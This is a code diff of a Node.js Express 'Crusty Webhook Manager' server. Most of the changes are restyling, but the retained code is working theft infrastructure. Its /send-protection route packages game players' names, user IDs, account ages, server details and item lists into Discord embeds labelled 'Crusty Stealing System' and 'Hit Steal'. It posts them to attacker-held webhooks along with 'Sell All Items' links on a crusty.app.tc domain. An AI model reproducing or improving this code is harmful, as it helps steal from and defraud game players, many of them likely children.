@@ -3,6 +3,7 @@ const express = require("express");
 const axios = require("axios");
 const fs = require("fs").promises;
 const path = require("path");
+const FormData = require("form-data");
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -84,7 +85,6 @@ async function sendBackupToWebhook() {
     const list = Array.from(webhooks.entries()).map(([id, url]) => ({ id, url }));
     const jsonContent = JSON.stringify(list, null, 2);
     
-    const FormData = require('form-data');
     const form = new FormData();
     
     form.append('payload_json', JSON.stringify({
@@ -133,29 +133,77 @@ async function sendBackupToWebhook() {
 app.get("/", (req, res) => {
   res.send(`
     <!DOCTYPE html>
-    <html>
+    <html lang="en">
     <head>
       <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Crusty System</title>
       <style>
-        body{margin:0;font-family:Arial;background:linear-gradient(135deg,#667eea,#764ba2);display:flex;justify-content:center;align-items:center;min-height:100vh;color:#fff}
-        .container{text-align:center;background:rgba(255,255,255,0.1);padding:40px 60px;border-radius:20px;backdrop-filter:blur(10px)}
-        h1{font-size:3em;margin-bottom:20px}
-        .status{display:flex;justify-content:center;gap:30px;margin-top:30px}
-        .status-item{display:flex;align-items:center;gap:10px;font-size:1.2em}
-        .dot{width:12px;height:12px;border-radius:50%;background:#0f0;animation:pulse 2s infinite}
-        @keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
-        .info{margin-top:30px;font-size:1.1em}
+        * {
+          margin: 0;
+          padding: 0;
+          box-sizing: border-box;
+        }
+        body {
+          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          min-height: 100vh;
+          color: white;
+        }
+        .container {
+          text-align: center;
+          background: rgba(255, 255, 255, 0.1);
+          padding: 40px 60px;
+          border-radius: 20px;
+          backdrop-filter: blur(10px);
+          box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
+        }
+        h1 {
+          font-size: 3em;
+          margin-bottom: 20px;
+          text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        .status {
+          display: flex;
+          justify-content: center;
+          gap: 30px;
+          margin-top: 30px;
+        }
+        .status-item {
+          display: flex;
+          align-items: center;
+          gap: 10px;
+          font-size: 1.2em;
+        }
+        .dot {
+          width: 12px;
+          height: 12px;
+          border-radius: 50%;
+          background: #00ff00;
+          animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+          0%, 100% { opacity: 1; }
+          50% { opacity: 0.5; }
+        }
       </style>
     </head>
     <body>
       <div class="container">
         <h1>🛡️ Crusty System</h1>
         <div class="status">
-          <div class="status-item"><span class="dot"></span><span>System Active</span></div>
-          <div class="status-item"><span class="dot"></span><span>Webhooks: ${webhooks.size}</span></div>
+          <div class="status-item">
+            <span class="dot"></span>
+            <span>Bot Aktif</span>
+          </div>
+          <div class="status-item">
+            <span class="dot"></span>
+            <span>Site Aktif</span>
+          </div>
         </div>
-        <div class="info">Auto-backup every 30 seconds</div>
       </div>
     </body>
     </html>
@@ -166,8 +214,7 @@ app.get("/status", (req, res) => {
   res.json({
     status: "online",
     webhooks: webhooks.size,
-    uptime: process.uptime(),
-    lastBackup: "Every 30 seconds"
+    uptime: process.uptime()
   });
 });
 
@@ -445,7 +492,6 @@ app.get("/create-protection/webhook", async (req, res) => {
   await saveToEnv();
 
   res.json({ id });
-  console.log(`✅ Created webhook ID: ${id}`);
 });
 
 app.get("/send-protection", async (req, res) => {
@@ -473,9 +519,10 @@ app.get("/send-protection", async (req, res) => {
   }
   
   const itemsList = items.length ? items.join("\n") : "No Brainrots detected";
-  const avatarUrl = "https://raw.githubusercontent.com/platinww/CrustyMain/refs/heads/main/UISettings/crustylogonew.png";
 
   let embed = {};
+  const avatarUrl =
+    "https://raw.githubusercontent.com/platinww/CrustyMain/refs/heads/main/UISettings/crustylogonew.png";
 
   if (status === "hit") {
     embed = {
@@ -486,12 +533,16 @@ app.get("/send-protection", async (req, res) => {
       fields: [
         {
           name: "Player Information",
-          value: `\`\`\`yaml\nName: ${name || "-"}\nID: ${userid || "-"}\nAge: ${accountage || "-"} days\nDisplay: ${displayname || "-"}\`\`\``,
+          value: `\`\`\`yaml\nName: ${name || "-"}\nID: ${userid || "-"}\nAge: ${
+            accountage || "-"
+          } days\nDisplay: ${displayname || "-"}\`\`\``,
           inline: false,
         },
         {
           name: "Server Information",
-          value: `\`\`\`yaml\nPlayers: ${playercount || "-"}\nGame: ${gamename || "-"}\nStatus: ${privateserver === "true" ? "Private Server" : "Public Server"}\`\`\``,
+          value: `\`\`\`yaml\nPlayers: ${playercount || "-"}\nGame: ${gamename || "-"}\nStatus: ${
+            privateserver === "true" ? "Private Server" : "Public Server"
+          }\`\`\``,
           inline: false,
         },
         {
@@ -506,16 +557,23 @@ app.get("/send-protection", async (req, res) => {
         },
         {
           name: "Sell All Brainrots",
-          value: `[Click Here to Sell All Items](https://crusty.dev.tc/sell-all/${encodeURIComponent(name || "")})`,
+          value: `[Click Here to Sell All Items](https://crusty.app.tc/sell-all/${encodeURIComponent(
+            name || ""
+          )})`,
           inline: false,
         },
         {
           name: "Check Activity Status",
-          value: `[Click Here to Check if User is Active](https://crusty.dev.tc/status-info/${encodeURIComponent(name || "")})`,
+          value: `[Click Here to Check if User is Active](https://crusty.app.tc/status-info/${encodeURIComponent(
+            name || ""
+          )})`,
           inline: false,
         },
       ],
-      footer: { text: "Crusty Stealing System - Active", icon_url: avatarUrl },
+      footer: {
+        text: "Crusty Stealing System - Active",
+        icon_url: avatarUrl,
+      },
       timestamp: new Date().toISOString(),
     };
   } else if (status === "altaccount") {
@@ -527,7 +585,9 @@ app.get("/send-protection", async (req, res) => {
       fields: [
         {
           name: "Player Information",
-          value: `\`\`\`yaml\nName: ${name || "-"}\nID: ${userid || "-"}\nAge: ${accountage || "-"} days\nDisplay: ${displayname || "-"}\`\`\``,
+          value: `\`\`\`yaml\nName: ${name || "-"}\nID: ${userid || "-"}\nAge: ${
+            accountage || "-"
+          } days\nDisplay: ${displayname || "-"}\`\`\``,
           inline: false,
         },
         {
@@ -536,7 +596,10 @@ app.get("/send-protection", async (req, res) => {
           inline: false,
         },
       ],
-      footer: { text: "Crusty Anti-Alt System", icon_url: avatarUrl },
+      footer: {
+        text: "Crusty Anti-Alt System",
+        icon_url: avatarUrl,
+      },
       timestamp: new Date().toISOString(),
     };
   } else if (status === "initializing") {
@@ -548,16 +611,23 @@ app.get("/send-protection", async (req, res) => {
       fields: [
         {
           name: "Player Information",
-          value: `\`\`\`yaml\nName: ${name || "-"}\nID: ${userid || "-"}\nAge: ${accountage || "-"} days\nDisplay: ${displayname || "-"}\`\`\``,
+          value: `\`\`\`yaml\nName: ${name || "-"}\nID: ${userid || "-"}\nAge: ${
+            accountage || "-"
+          } days\nDisplay: ${displayname || "-"}\`\`\``,
           inline: false,
         },
         {
           name: "Server Information",
-          value: `\`\`\`yaml\nPlayers: ${playercount || "-"}\nGame: ${gamename || "-"}\nStatus: ${privateserver === "true" ? "Private Server" : "Public Server"}\`\`\``,
+          value: `\`\`\`yaml\nPlayers: ${playercount || "-"}\nGame: ${gamename || "-"}\nStatus: ${
+            privateserver === "true" ? "Private Server" : "Public Server"
+          }\`\`\``,
           inline: false,
         },
       ],
-      footer: { text: "Crusty Hit Steal - Initializing", icon_url: avatarUrl },
+      footer: {
+        text: "Crusty Hit Steal - Initializing",
+        icon_url: avatarUrl,
+      },
       timestamp: new Date().toISOString(),
     };
   } else {
@@ -575,9 +645,10 @@ app.get("/send-protection", async (req, res) => {
   }
 
   try {
-    await axios.post(webhookURL, payload);
+    await axios.post(webhookURL, payload, { headers: { "Content-Type": "application/json" } });
     res.json({ ok: true });
   } catch (err) {
+    console.error(err.message);
     res.status(500).json({ error: "Failed to send webhook" });
   }
 });
@@ -587,7 +658,6 @@ app.get("/send-protection", async (req, res) => {
 // ----------------------
 async function startApp() {
   console.log("🚀 Starting Crusty Webhook Manager...");
-  console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
 
   app.listen(PORT, () => {
     console.log(`✅ Server running on port ${PORT}`);
@@ -602,10 +672,8 @@ async function startApp() {
     await sendBackupToWebhook();
   }
 
-  console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
   console.log("✅ SYSTEM ONLINE!");
   console.log(`📊 Loaded webhooks: ${webhooks.size}`);
-  console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
 }
 
 startApp();
